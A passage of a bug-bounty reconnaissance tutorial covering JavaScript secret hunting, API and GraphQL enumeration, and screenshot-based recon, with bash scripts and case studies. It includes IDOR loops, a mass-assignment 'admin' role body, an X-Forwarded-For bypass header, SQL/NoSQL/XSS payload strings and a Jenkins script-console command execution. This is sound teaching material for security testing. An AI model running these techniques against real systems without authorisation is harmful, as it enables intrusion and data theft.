const ADMIN_PANEL = "https://admin-staging.company.com"

// 5. Database Connection Strings
const DB_URL = "mongodb://user:pass@host:27017/db"
const MYSQL = "mysql://root:password@localhost/prod"

// 6. Comments with Secrets
// TODO: Remove before production
// Admin: admin@company.com / Password123!
// API Key: sk_live_abc123

// 7. Hardcoded Credentials
username: "admin"
password: "SuperSecret123"

// 8. Logic Flaws
if (userRole === "admin" || debug === true) {
    // Everyone can access if debug=true!
}

// 9. Hidden Features
const FEATURES = {
    adminPanel: true,
    debugMode: true,
    internalAPI: "https://..."
}

// 10. Source Maps
//# sourceMappingURL=main.js.map
// Download the .map file for original source!
```

### 🔍 Source Map Analysis

#### What Are Source Maps?

```javascript
// Minified production file:
var a="secret";function b(){return fetch("https://api.com")}

// Has a source map comment:
//# sourceMappingURL=main.js.map

// The .map file contains ORIGINAL source code!
```

#### Downloading Source Maps

```bash
# Find source map references
curl -s https://target.com/app.js | grep "sourceMappingURL"

# Output:
//# sourceMappingURL=app.js.map

# Download the source map
curl https://target.com/app.js.map -o app.js.map

# Extract original sources
cat app.js.map | jq -r '.sources[]'

# Often reveals:
- Original file structure
- Developer comments
- Full variable names
- Internal paths
- Configuration files
```

#### Tool: sourcemapper

```bash
# Install
npm install -g sourcemapper

# Extract sources from map
sourcemapper -u https://target.com/app.js.map -o extracted/

# Now you have original source code!
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Analyze a real JavaScript file
curl -s https://github.com/static/app.js | js-beautify > github_app.js
grep -i "api\|key\|secret\|token" github_app.js

# Exercise 2: Build your own scanner
cat > my_js_scanner.sh << 'EOF'
#!/bin/bash
URL=$1
echo "Fetching JavaScript..."
curl -s $URL > temp.js
echo "Beautifying..."
js-beautify temp.js > readable.js
echo "Searching for secrets..."
grep -Ei "api|key|secret|password|token" readable.js
echo "Extracting URLs..."
grep -Eo "https?://[a-zA-Z0-9./?=_-]*" readable.js | sort -u
rm temp.js
EOF
chmod +x my_js_scanner.sh
./my_js_scanner.sh https://example.com/app.js

# Exercise 3: LinkFinder practice
echo "https://juice-shop.herokuapp.com" | \
  getJS | \
  while read js; do
    python3 linkfinder.py -i $js -o cli
  done

# Exercise 4: Create comprehensive report
cat > js_analysis.sh << 'EOF'
#!/bin/bash
TARGET=$1
echo "Collecting JS files..."
echo $TARGET | waybackurls | grep "\.js$" | head -10 > js_files.txt
echo "Analyzing..."
cat js_files.txt | while read js; do
  echo "=== $js ==="
  curl -s $js | js-beautify | grep -Ei "api|secret|key" | head -5
  echo ""
done
EOF
chmod +x js_analysis.sh
./js_analysis.sh target.com
```

### 📊 Quick Reference

```bash
# Collect JS files
echo "target.com" | waybackurls | grep "\.js$" > js_files.txt
echo "target.com" | gau | grep "\.js$" >> js_files.txt

# Find endpoints
python3 linkfinder.py -i https://target.com/app.js -o cli

# Find secrets
python3 SecretFinder.py -i https://target.com/app.js -o cli

# Beautify minified JS
curl https://target.com/app.min.js | js-beautify > readable.js

# Search patterns
grep -Eo "api[_-]?key.{0,50}" app.js
grep -Eo "AKIA[0-9A-Z]{16}" app.js
grep -Eo "https?://[a-zA-Z0-9./?=_-]*" app.js

# Extract all URLs
grep -rEo "https?://[a-zA-Z0-9./?=_-]*" *.js | sort -u

# Download source maps
curl https://target.com/app.js.map -o app.js.map
```

---

## Phase 6: API Enumeration

### 🎯 Objective

**Discover, map, and test API endpoints for authentication, authorization, and business logic flaws.**

### Why APIs Are Critical Targets

```
Traditional Web App Security: Frontend validates input
API Security: Backend often trusts frontend

Common API Issues:
├─ Broken Authentication (no token required)
├─ Broken Authorization (IDOR - access others' data)
├─ Excessive Data Exposure (returns too much info)
├─ Lack of Rate Limiting (brute force possible)
├─ Mass Assignment (add admin=true to request)
└─ Business Logic Flaws (negative prices, etc.)

70% of critical bugs in modern apps are in APIs
```

### Understanding APIs

#### REST API Example

```
GET /api/users/123          → Get user 123's data
POST /api/users             → Create new user
PUT /api/users/123          → Update user 123
DELETE /api/users/123       → Delete user 123
```

#### GraphQL API Example

```graphql
# Single endpoint: /graphql

query {
  user(id: 123) {
    name
    email
    creditCard
  }
}
```

### 🔍 Finding APIs

#### Method 1: Browser Network Tab

```
1. Open target website
2. Press F12 → Network tab
3. Filter: Fetch/XHR
4. Use the application (click buttons, submit forms)
5. Watch API calls appear

Example from a banking app:
POST https://api.bank.com/v1/transfer
GET https://api.bank.com/v1/account/balance
GET https://api.bank.com/v1/transactions
```

#### Method 2: Mobile App Traffic Interception

```bash
# Setup Burp Suite as proxy
1. Burp Suite → Proxy → Options → Proxy Listener: 0.0.0.0:8080
2. Phone WiFi → Manual Proxy → Your IP:8080
3. Install Burp CA certificate on phone
4. Use mobile app
5. Watch API calls in Burp

Common findings:
/api/v1/user/profile
/api/v2/internal/admin
/api/mobile/debug/logs  ← Often forgotten!
```

#### Method 3: JavaScript File Analysis (From Previous Phase)

```bash
# Extract API endpoints from JS
cat js_files.txt | while read js; do
  curl -s $js | grep -Eo "(api|rest|graphql)/[a-zA-Z0-9/_-]*"
done | sort -u > api_endpoints.txt
```

### 🛠️ Tool 1: Burp Suite (Industry Standard)

#### Setup

```
1. Download: https://portswigger.net/burp/communitydownload
2. Install and open
3. Proxy → Intercept → Turn OFF intercept (just log)
4. Configure browser proxy: localhost:8080
5. Browse target site
6. HTTP History tab = All requests logged
```

#### Finding APIs in Burp

```
1. HTTP History → Right-click table header
2. Add column: "URL"
3. Filter: Only show: "JSON", "XHR", or file extension: ".json"
4. Look for patterns:
   /api/
   /rest/
   /v1/
   /v2/
   /graphql
```

#### Testing APIs in Burp Repeater

```
1. Find interesting API request in HTTP History
2. Right-click → Send to Repeater
3. Modify request
4. Click "Send"
5. Analyze response

Example test:
Original: GET /api/users/123
Test 1:   GET /api/users/124  (IDOR test)
Test 2:   GET /api/users/1    (Admin user?)
Test 3:   DELETE /api/users/123 (Can you delete?)
```

### 🛠️ Tool 2: Postman (API Testing)

#### Setup

```
1. Download: https://www.postman.com/downloads/
2. Install and create account
3. Create new Collection
4. Name it after your target
```

#### Import from Burp

```
1. Burp → Proxy → HTTP History
2. Select requests → Right-click → Save items
3. Postman → Import → Upload Burp file
4. Now you can replay/modify requests
```

#### Manual API Testing

```
Example: Testing /api/v1/users endpoint

Request 1: List all users
Method: GET
URL: https://api.target.com/v1/users
Headers: (empty)
Send → Check if authentication required

Request 2: Get specific user
GET https://api.target.com/v1/users/123
Check response

Request 3: IDOR test
GET https://api.target.com/v1/users/124
Can you see another user's data?

Request 4: Try different methods
POST /api/v1/users (Can you create users?)
DELETE /api/v1/users/123 (Can you delete?)
PUT /api/v1/users/123 (Can you modify?)

Request 5: Mass assignment
POST /api/v1/users
Body: {
  "username": "hacker",
  "email": "hacker@email.com",
  "role": "admin"  ← Try adding admin role
}
```

### 🛠️ Tool 3: Arjun (Parameter Discovery)

#### Installation

```bash
pip3 install arjun
```

#### Usage

```bash
# Find hidden parameters
arjun -u https://api.target.com/v1/users

# Example output:
[+] Valid parameter found: id
[+] Valid parameter found: username
[+] Valid parameter found: debug
[+] Valid parameter found: admin

# Now test with discovered parameters:
curl "https://api.target.com/v1/users?debug=true"
curl "https://api.target.com/v1/users?admin=true"
```

#### Bulk Parameter Discovery

```bash
cat api_endpoints.txt | while read endpoint; do
  echo "Testing: $endpoint"
  arjun -u $endpoint
done
```

### 🛠️ Tool 4: Kiterunner (API Endpoint Scanner)

#### Installation

```bash
wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_amd64.tar.gz
tar -xvf kiterunner_1.0.2_linux_amd64.tar.gz
sudo mv kr /usr/local/bin/
```

#### Usage

```bash
# Scan for API routes
kr scan https://api.target.com -w routes-large.kite

# Example output:
GET    200 [    12,  1234,   100] https://api.target.com/v1/users
POST   401 [     5,   234,    50] https://api.target.com/v1/admin
GET    403 [     1,    89,    20] https://api.target.com/v1/internal/debug
PUT    200 [     8,   456,    75] https://api.target.com/v1/users/update

# Specific wordlist
kr scan https://api.target.com -w ~/wordlists/api-routes.txt

# Multiple targets
kr scan -A=hosts.txt -w routes.kite
```

### 🎯 API Documentation Discovery

#### Common API Doc Paths

```bash
# Create wordlist
cat > api_docs.txt << 'EOF'
/swagger
/swagger.json
/swagger-ui
/swagger-ui.html
/swagger/index.html
/api/swagger
/api/swagger.json
/api/swagger-ui
/api-docs
/api/docs
/api/documentation
/docs
/documentation
/openapi.json
/openapi.yaml
/api/openapi.json
/v1/swagger.json
/v2/swagger.json
/graphql
/graphiql
/playground
/api/graphql
/__graphql
/console
/api-console
EOF

# Test all paths
ffuf -w api_docs.txt -u https://target.com/FUZZ -mc 200,301,302
```

#### Swagger/OpenAPI Analysis

```bash
# Download Swagger file
curl https://api.target.com/swagger.json -o swagger.json

# Parse it
cat swagger.json | jq -r '.paths | keys[]'

# Example output:
/api/v1/users
/api/v1/users/{id}
/api/v1/admin/users
/api/v1/admin/settings
/api/v1/internal/debug

# Extract all endpoints with methods
cat swagger.json | jq -r '.paths | to_entries[] | "\(.key): \(.value | keys[])"'

# Output:
/api/v1/users: GET
/api/v1/users: POST
/api/v1/users/{id}: GET
/api/v1/users/{id}: PUT
/api/v1/users/{id}: DELETE
/api/v1/admin/users: GET  ← Test this without auth!
```

### 🔥 GraphQL Enumeration

#### What is GraphQL?

```
REST API: Multiple endpoints
  GET /api/users
  GET /api/posts
  GET /api/comments

GraphQL: Single endpoint
  POST /graphql
  {
    query {
      users { name email }
      posts { title content }
      comments { text author }
    }
  }
```

#### Finding GraphQL Endpoints

```bash
# Common paths
/graphql
/graphiql
/playground
/api/graphql
/v1/graphql
/query
/console

# Test
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__typename}"}'

# If response contains "data", GraphQL confirmed!
```

#### GraphQL Introspection

```bash
# Full schema dump (if introspection enabled)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"
  }' | jq '.' > graphql_schema.json

# This reveals:
- All available queries
- All mutations (data modifications)
- Field names
- Types
```

#### Tool: GraphQLmap

```bash
# Install
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
pip3 install -r requirements.txt

# Usage
python3 graphqlmap.py -u https://target.com/graphql

# Interactive mode:
GraphQLmap > dump_new
# Dumps entire schema

GraphQLmap > nosqli
# Tests for NoSQL injection

GraphQLmap > postgresqli
# Tests for SQL injection
```

### 💡 Practical API Testing Workflow

```bash
#!/bin/bash
# api-recon.sh - Complete API enumeration

TARGET="$1"
OUTPUT="api_recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{docs,endpoints,tests}

echo "[+] Phase 1: Finding API documentation..."
ffuf -w api_docs.txt \
     -u $TARGET/FUZZ \
     -mc 200,301,302 \
     -s | tee $OUTPUT/docs/found.txt

echo "[+] Phase 2: Downloading Swagger/OpenAPI specs..."
while read doc; do
  curl -s $TARGET/$doc -o $OUTPUT/docs/$(echo $doc | tr '/' '_').json
done < $OUTPUT/docs/found.txt

echo "[+] Phase 3: Extracting endpoints from docs..."
find $OUTPUT/docs -name "*.json" -exec cat {} \; | \
  jq -r '.paths | keys[]' 2>/dev/null | \
  sort -u > $OUTPUT/endpoints/from_docs.txt

echo "[+] Phase 4: Finding endpoints with Kiterunner..."
kr scan $TARGET -w routes-large.kite -x 20 \
  --fail-status-codes 404 \
  -o $OUTPUT/endpoints/kiterunner.txt

echo "[+] Phase 5: Checking for GraphQL..."
for path in /graphql /graphiql /playground /api/graphql; do
  response=$(curl -s -X POST $TARGET$path \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  
  if echo $response | grep -q "data"; then
    echo "GraphQL found at: $TARGET$path" | tee -a $OUTPUT/endpoints/graphql.txt
  fi
done

echo "[+] Phase 6: Parameter discovery on found endpoints..."
cat $OUTPUT/endpoints/*.txt | grep -v "^#" | while read endpoint; do
  echo "Testing: $endpoint"
  arjun -u $TARGET$endpoint -oJ $OUTPUT/tests/params_$(echo $endpoint | md5sum | cut -d' ' -f1).json
done

echo "[+] Phase 7: Testing common IDOR patterns..."
cat > $OUTPUT/tests/idor_test.sh << 'TESTSCRIPT'
#!/bin/bash
# Test IDOR on user endpoints
for id in 1 2 3 123 1000; do
  echo "Testing ID: $id"
  curl -s "$TARGET/api/v1/users/$id" | jq '.'
done
TESTSCRIPT
chmod +x $OUTPUT/tests/idor_test.sh

echo "[+] API Reconnaissance complete!"
echo "    Documentation found: $(wc -l < $OUTPUT/docs/found.txt)"
echo "    Endpoints discovered: $(wc -l < $OUTPUT/endpoints/*.txt | tail -1)"
echo ""
echo "Next steps:"
echo "1. Review: $OUTPUT/endpoints/"
echo "2. Test each endpoint for:"
echo "   - Authentication bypass"
echo "   - IDOR (change IDs)"
echo "   - Mass assignment"
echo "   - Rate limiting"
```

### 🏆 Case Study: API Authentication Bypass

```
Hunter: @nahamsec
Platform: HackerOne
Target: [Redacted Social Media Platform]
Bounty: $15,000

Discovery:

1. Found Swagger documentation:
   https://api.target.com/swagger.json

2. Discovered endpoint:
   GET /api/v2/admin/users/export

3. Swagger claimed authentication required

4. Tested without auth:
   curl https://api.target.com/v2/admin/users/export

5. Response:
   {
     "users": [
       {"id": 1, "email": "user1@gmail.com", "phone": "+1234567890"},
       {"id": 2, "email": "user2@gmail.com", "phone": "+0987654321"},
       // ... 50,000 more
     ]
   }

6. NO AUTHENTICATION REQUIRED!

7. Impact:
   - Export entire user database
   - PII exposure (emails, phone numbers, names)
   - No rate limiting
   - No authorization checks

8. Bounty: $15,000

Key: Always test Swagger endpoints even if docs say "auth required"
```

### 🏆 Case Study: GraphQL IDOR

```
Hunter: @samwcyo
Platform: Bugcrowd
Target: [Redacted E-commerce]
Bounty: $10,000

Process:

1. Found GraphQL endpoint:
   https://api.target.com/graphql

2. Introspection query revealed:
   query {
     invoice(id: Int!) {
       invoiceNumber
       amount
       creditCard
       billingAddress
     }
   }

3. Tested with own invoice ID:
   {
     "query": "query { invoice(id: 12345) { invoiceNumber amount creditCard } }"
   }

4. Response showed my invoice

5. IDOR test - changed ID:
   {
     "query": "query { invoice(id: 12346) { invoiceNumber amount creditCard } }"
   }

6. Response showed someone else's invoice!
   {
     "data": {
       "invoice": {
         "invoiceNumber": "INV-00012346",
         "amount": "$5,299.99",
         "creditCard": "4532-****-****-1234"
       }
     }
   }

7. Could access ANY invoice by changing ID

8. Impact:
   - Access all customer invoices
   - Credit card information exposed
   - Financial data breach

9. Bounty: $10,000

Key: Always test GraphQL queries with different IDs
```

### 🎯 API Testing Checklist

```markdown
For EVERY API endpoint discovered:

## Authentication Testing
- [ ] Can you access without token?
- [ ] Can you use expired token?
- [ ] Can you use another user's token?
- [ ] What happens with invalid token?

## Authorization Testing (IDOR)
- [ ] Change numeric IDs (user=123 → user=124)
- [ ] Change UUIDs to other valid UUIDs
- [ ] Access admin endpoints as regular user
- [ ] Modify other users' data

## HTTP Method Testing
- [ ] Try GET, POST, PUT, DELETE, PATCH, OPTIONS
- [ ] Does wrong method work? (GET instead of POST)
- [ ] What does OPTIONS reveal?

## Input Validation
- [ ] Very long input (10,000 characters)
- [ ] Special characters (<>"'&;)
- [ ] SQL injection payloads (' OR 1=1--)
- [ ] NoSQL injection ({$ne: null})
- [ ] XSS payloads (<script>alert(1)</script>)

## Business Logic
- [ ] Negative numbers (quantity: -1, price: -100)
- [ ] Zero values (price: 0)
- [ ] Replay attacks (submit same request twice)
- [ ] Race conditions (parallel requests)

## Rate Limiting
- [ ] Can you send 1000 requests without blocking?
- [ ] Brute force protection?
- [ ] Account lockout mechanism?

## Mass Assignment
- [ ] Add extra fields like "isAdmin": true
- [ ] Add "role": "admin"
- [ ] Can you modify unintended fields?

## Data Exposure
- [ ] Does response contain passwords/tokens?
- [ ] More data than needed?
- [ ] Internal IPs/paths revealed?
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Find API docs on test site
ffuf -w api_docs.txt -u https://petstore.swagger.io/FUZZ -mc 200

# Exercise 2: Test public GraphQL endpoint
curl -X POST https://countries.trevorblades.com/ \
  -H "Content-Type: application/json" \
  -d '{"query": "{countries {name code}}"}'

# Exercise 3: Build API endpoint fuzzer
cat > api_fuzzer.sh << 'EOF'
#!/bin/bash
BASE_URL=$1
for version in v1 v2 v3 api/v1 api/v2; do
  for endpoint in users posts admin settings; do
    url="$BASE_URL/$version/$endpoint"
    response=$(curl -s -o /dev/null -w "%{http_code}" $url)
    if [ $response != "404" ]; then
      echo "Found: $url [$response]"
    fi
  done
done
EOF
chmod +x api_fuzzer.sh
./api_fuzzer.sh https://api.target.com

# Exercise 4: GraphQL introspection
cat > graphql_introspect.sh << 'EOF'
#!/bin/bash
curl -X POST $1 \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.'
EOF
chmod +x graphql_introspect.sh
./graphql_introspect.sh https://countries.trevorblades.com/
```

### 📊 Quick Reference

```bash
# Find API documentation
ffuf -w api_docs.txt -u https://target.com/FUZZ -mc 200

# Kiterunner API scanning
kr scan https://api.target.com -w routes-large.kite

# Parameter discovery
arjun -u https://api.target.com/v1/users

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# IDOR testing
for id in {1..100}; do
  curl "https://api.target.com/users/$id"
done

# Method fuzzing
for method in GET POST PUT DELETE PATCH; do
  curl -X $method https://api.target.com/admin
done
```

---

## Phase 7: Visual Reconnaissance

### 🎯 Objective

**Automate screenshot capture and visual inspection to quickly identify interesting targets among hundreds or thousands of hosts.**

### Why Screenshots Matter

```
The Problem:
You discovered 1,000 live subdomains
Each could be different:
├─ Login panel
├─ Default Apache page
├─ Admin dashboard
├─ Error message
├─ Directory listing
├─ API documentation
└─ Blank page

Manually visiting 1,000 URLs = 10+ hours
Taking automated screenshots = 10 minutes
Visual review of screenshots = 30 minutes

One interesting screenshot can lead to $10,000 bounty
```

### What Visual Recon Reveals

```yaml
High-Value Findings:
  - Login panels (admin, phpmyadmin, cPanel)
  - Default pages (Jenkins, Grafana, Tomcat)
  - Error messages (stack traces, paths, versions)
  - Directory listings (exposed files)
  - Exposed dashboards (Kibana, Grafana, Admin panels)
  - Debug pages (phpinfo, debug mode)
  - Internal IPs (in error messages)
  - Version numbers (in banners/footers)

Red Flags to Look For:
  - "Admin" in title
  - Login forms on unusual ports
  - Default credentials hints
  - Database management tools
  - Configuration panels
  - Monitoring dashboards
  - CI/CD tools (Jenkins, GitLab)
  - Directory listing indices
```

### 🛠️ Tool 1: EyeWitness (Comprehensive)

#### Installation

```bash
# Clone repository
git clone https://github.com/RedSiege/EyeWitness.git
cd EyeWitness/Python/setup

# Run setup script
sudo ./setup.sh

# Verify installation
cd ../
python3 EyeWitness.py --help
```

#### Basic Usage

```bash
# From file with URLs
python3 EyeWitness.py -f urls.txt --web

# From Nmap XML
nmap -sV -p 80,443,8080 target.com -oX nmap.xml
python3 EyeWitness.py -x nmap.xml --web

# Specify output directory
python3 EyeWitness.py -f urls.txt --web -d eyewitness_scan_2024

# Add delay (rate limiting)
python3 EyeWitness.py -f urls.txt --web --delay 5

# Custom timeout
python3 EyeWitness.py -f urls.txt --web --timeout 10
```

#### Advanced Usage

```bash
# With custom headers (bypass basic restrictions)
python3 EyeWitness.py -f urls.txt --web \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --add-header "X-Forwarded-For: 127.0.0.1"

# Skip default pages (Apache, IIS, nginx defaults)
python3 EyeWitness.py -f urls.txt --web --no-prompt

# Multiple workers (faster)
python3 EyeWitness.py -f urls.txt --web --threads 10

# Full scan with all options
python3 EyeWitness.py \
  -f subdomains.txt \
  --web \
  -d eyewitness_full \
  --delay 2 \
  --timeout 10 \
  --threads 10 \
  --no-prompt
```

#### Understanding the Report

```
EyeWitness generates HTML report with:

1. Categories:
   ├─ High Value Targets (automatically detected)
   ├─ Login Panels (forms detected)
   ├─ Default Pages (Apache, nginx, IIS)
   └─ All Screenshots

2. Information Displayed:
   ├─ Screenshot
   ├─ Page Title
   ├─ HTTP Status Code
   ├─ Server Header
   ├─ Content Length
   └─ Page Source (click to view)

3. Search/Filter Options:
   ├─ Search by title
   ├─ Filter by status code
   └─ Filter by server type

Open report.html in browser to review
```

### 🛠️ Tool 2: Gowitness (Fast & Lightweight)

#### Installation

```bash
go install github.com/sensepost/gowitness@latest

# Verify
gowitness version
```

#### Basic Usage

```bash
# Single URL
gowitness single https://example.com

# From file
gowitness file -f urls.txt

# Specify output path
gowitness file -f urls.txt --screenshot-path ./screenshots/

# With delay
gowitness file -f urls.txt --delay 5

# Custom timeout
gowitness file -f urls.txt --timeout 10
```

#### Advanced Features

```bash
# Full page screenshot (not just viewport)
gowitness file -f urls.txt --fullpage

# Custom resolution
gowitness file -f urls.txt --resolution-x 1920 --resolution-y 1080

# Disable JavaScript (faster)
gowitness file -f urls.txt --disable-javascript

# Custom user agent
gowitness file -f urls.txt --user-agent "CustomBot/1.0"

# Chrome flags (advanced)
gowitness file -f urls.txt --chrome-flags "--disable-gpu,--no-sandbox"
```

#### Web Report Server

```bash
# After taking screenshots, start web server
gowitness report serve

# Opens web interface at http://localhost:7171
# Features:
├─ Gallery view of all screenshots
├─ Search/filter functionality
├─ Metadata viewing
├─ Export options
└─ Screenshot comparison
```

#### Database Integration

```bash
# Gowitness stores data in SQLite database
# Default location: gowitness.sqlite3

# Query database
sqlite3 gowitness.sqlite3 "SELECT url, title, status FROM urls WHERE status=200;"

# Export to JSON
sqlite3 gowitness.sqlite3 -json "SELECT * FROM urls;" > results.json
```

### 🛠️ Tool 3: Aquatone (Classic)

#### Installation

```bash
go install github.com/michenriksen/aquatone@latest
```

#### Usage

```bash
# From domains list
cat domains.txt | aquatone

# Specify ports
cat domains.txt | aquatone -ports 80,443,8080,8443

# Custom output directory
cat domains.txt | aquatone -out aquatone_report

# With threads
cat domains.txt | aquatone -threads 10

# Custom timeout
cat domains.txt | aquatone -timeout 30000
```

#### Report Features

```
Aquatone generates:
├─ aquatone_report.html (main report)
├─ screenshots/ (PNG files)
├─ html/ (saved HTML source)
└─ aquatone_urls.txt (tested URLs)

Report includes:
├─ Responsive screenshots
├─ Page titles
├─ HTTP headers
├─ Technologies detected
└─ Response similarity clustering
```

### 🛠️ Tool 4: httpx Screenshots (Quick & Simple)

#### Usage

```bash
# Basic screenshot with httpx
cat urls.txt | httpx -screenshot -screenshot-path ./screens/

# Combined with other httpx features
cat urls.txt | httpx \
  -title \
  -tech-detect \
  -status-code \
  -screenshot \
  -screenshot-path ./screenshots/

# Only screenshot specific status codes
cat urls.txt | httpx -mc 200,403 -screenshot
```

### 💡 Complete Visual Recon Workflow

```bash
#!/bin/bash
# visual-recon.sh - Complete visual reconnaissance

TARGET_DOMAIN="$1"
OUTPUT="visual_recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{eyewitness,gowitness,aquatone,httpx,analysis}

echo "[+] Starting visual reconnaissance for $TARGET_DOMAIN"

# Phase 1: Collect live hosts
echo "[+] Phase 1: Collecting live hosts..."
cat subdomains.txt | httpx -silent -mc 200,403,401,500,502 > $OUTPUT/live_hosts.txt
echo "    Found $(wc -l < $OUTPUT/live_hosts.txt) live hosts"

# Phase 2: httpx quick screenshots
echo "[+] Phase 2: Quick screenshots with httpx..."
cat $OUTPUT/live_hosts.txt | httpx \
  -title \
  -status-code \
  -tech-detect \
  -screenshot \
  -screenshot-path $OUTPUT/httpx/ \
  -json \
  -o $OUTPUT/httpx_results.json

# Phase 3: EyeWitness comprehensive scan
echo "[+] Phase 3: EyeWitness comprehensive scan..."
python3 ~/tools/EyeWitness/Python/EyeWitness.py \
  -f $OUTPUT/live_hosts.txt \
  --web \
  -d $OUTPUT/eyewitness \
  --delay 2 \
  --timeout 10 \
  --threads 5 \
  --no-prompt

# Phase 4: Gowitness with web server
echo "[+] Phase 4: Gowitness screenshots..."
cd $OUTPUT/gowitness
gowitness file -f $OUTPUT/live_hosts.txt \
  --fullpage \
  --screenshot-path ./ \
  --delay 2

# Phase 5: Analyze and categorize
echo "[+] Phase 5: Analyzing screenshots..."

# Find admin/login pages by title
cat $OUTPUT/httpx_results.json | \
  jq -r 'select(.title | test("admin|login|dashboard|panel"; "i")) | .url' \
  > $OUTPUT/analysis/admin_panels.txt

# Find error pages
cat $OUTPUT/httpx_results.json | \
  jq -r 'select(.status_code | test("500|502|503")) | .url' \
  > $OUTPUT/analysis/error_pages.txt

# Find 403 Forbidden (hidden content)
cat $OUTPUT/httpx_results.json | \
  jq -r 'select(.status_code == 403) | .url' \
  > $OUTPUT/analysis/forbidden.txt

# Find specific technologies
cat $OUTPUT/httpx_results.json | \
  jq -r 'select(.tech | contains(["WordPress"])) | .url' \
  > $OUTPUT/analysis/wordpress.txt

cat $OUTPUT/httpx_results.json | \
  jq -r 'select(.tech | contains(["Jenkins"])) | .url' \
  > $OUTPUT/analysis/jenkins.txt

# Phase 6: Create summary report
echo "[+] Phase 6: Creating summary..."
cat > $OUTPUT/SUMMARY.txt << EOF
Visual Reconnaissance Summary
Generated: $(date)
Target: $TARGET_DOMAIN

Statistics:
-----------
Total live hosts: $(wc -l < $OUTPUT/live_hosts.txt)
Admin/Login panels: $(wc -l < $OUTPUT/analysis/admin_panels.txt)
Error pages: $(wc -l < $OUTPUT/analysis/error_pages.txt)
Forbidden (403): $(wc -l < $OUTPUT/analysis/forbidden.txt)
WordPress sites: $(wc -l < $OUTPUT/analysis/wordpress.txt)
Jenkins instances: $(wc -l < $OUTPUT/analysis/jenkins.txt)

High Priority Targets:
----------------------
EOF

cat $OUTPUT/analysis/admin_panels.txt >> $OUTPUT/SUMMARY.txt

echo ""
echo "[+] Visual reconnaissance complete!"
echo ""
echo "    Review reports:"
echo "    ├─ EyeWitness: $OUTPUT/eyewitness/report.html"
echo "    ├─ Gowitness: cd $OUTPUT/gowitness && gowitness report serve"
echo "    ├─ httpx JSON: $OUTPUT/httpx_results.json"
echo "    └─ Summary: $OUTPUT/SUMMARY.txt"
echo ""
echo "    High priority targets:"
echo "    ├─ Admin panels: $(wc -l < $OUTPUT/analysis/admin_panels.txt)"
echo "    ├─ Error pages: $(wc -l < $OUTPUT/analysis/error_pages.txt)"
echo "    └─ Forbidden: $(wc -l < $OUTPUT/analysis/forbidden.txt)"
```

### 🎯 Screenshot Analysis Checklist

#### What to Look For (Priority Order)

```markdown
## 🔴 CRITICAL (Immediate Testing)

### Login Panels on Unusual Hosts
- [ ] admin.target.com with basic login
- [ ] dev.target.com with phpMyAdmin
- [ ] staging.target.com with admin panel
- [ ] test.target.com with Jenkins login

### Default Credentials Opportunities
- [ ] Tomcat Manager Application
- [ ] Jenkins Dashboard
- [ ] phpMyAdmin Login
- [ ] Grafana Login
- [ ] RabbitMQ Management
- [ ] Kibana Dashboard

### Exposed Admin Interfaces
- [ ] /admin accessible without auth
- [ ] /dashboard with data visible
- [ ] /panel showing user info
- [ ] /console with commands

### Error Messages
- [ ] Stack traces (shows code paths)
- [ ] Database errors (shows structure)
- [ ] Path disclosure (/var/www/html/...)
- [ ] Version numbers in errors

## 🟡 HIGH VALUE (Next Priority)

### Directory Listings
- [ ] Index of /backup
- [ ] Index of /uploads
- [ ] Index of /.git
- [ ] Index of /admin

### Development Environments
- [ ] dev.target.com accessible
- [ ] staging.target.com exposed
- [ ] test.target.com public
- [ ] Debug mode enabled

### Monitoring/Analytics Tools
- [ ] Grafana dashboards
- [ ] Kibana interfaces
- [ ] Prometheus metrics
- [ ] Status pages

### Version Information
- [ ] Software versions in footers
- [ ] "Powered by X version Y"
- [ ] Framework versions
- [ ] Server banners

## 🟢 MEDIUM VALUE (Worth Checking)

### Interesting Content
- [ ] API documentation pages
- [ ] Swagger/OpenAPI UI
- [ ] GraphQL Playground
- [ ] Internal documentation

### Different Technologies
- [ ] Old WordPress versions
- [ ] Drupal installations
- [ ] Custom applications
- [ ] Legacy systems

### Unusual Responses
- [ ] 403 on main page
- [ ] 401 requiring auth
- [ ] 500 server errors
- [ ] Redirect chains
```

### 🏆 Case Study: Screenshot Leading to RCE

```
Hunter: @zseano
Platform: Bugcrowd
Target: [Redacted Technology Company]
Bounty: $15,000

Discovery Process:

1. Collected 2,500 subdomains via passive recon
   subfinder -d target.com | httpx > live.txt

2. Ran EyeWitness on all live hosts
   python3 EyeWitness.py -f live.txt --web -d scan_results

3. Reviewed screenshots (30 minutes)
   Found: jenkins.old-staging.target.com
   Screenshot showed: "Jenkins" dashboard

4. Visited manually
   https://jenkins.old-staging.target.com:8080

5. Saw: Jenkins 2.107.1 (2018 version!)

6. Searched exploits
   searchsploit "Jenkins 2.107"
   
   Found: CVE-2019-1003000 (Script Console RCE)

7. Tested
   - Accessed /script console (no auth!)
   - Executed: println "id".execute().text
   - Got: uid=0(root) gid=0(root)

8. Impact:
   - Unauthenticated access
   - Remote Code Execution as root
   - Access to source code
   - Access to secrets/credentials
   - Lateral movement possible

9. Report: Critical - Unauthenticated RCE via Exposed Jenkins
   Bounty: $15,000

Key Takeaway:
- 2,500 screenshots reviewed in 30 minutes
- One old forgotten Jenkins instance
- Screenshot made it immediately visible
- Critical RCE in less than 1 hour
```

### 🏆 Case Study: Directory Listing via Screenshot

```
Hunter: @ngalongc
Platform: HackerOne
Target: [Redacted Financial Services]
Bounty: $8,500

Story:

1. Visual recon on 800 subdomains
   gowitness file -f subdomains.txt

2. Screenshot showed:
   Title: "Index of /backups"
   Content: List of .zip files

3. URL: https://old-backup.target.com/backups/

4. Files visible:
   database_dump_2024_01.zip    500 MB
   source_code_2024_01.tar.gz   250 MB
   customer_data_export.csv      50 MB
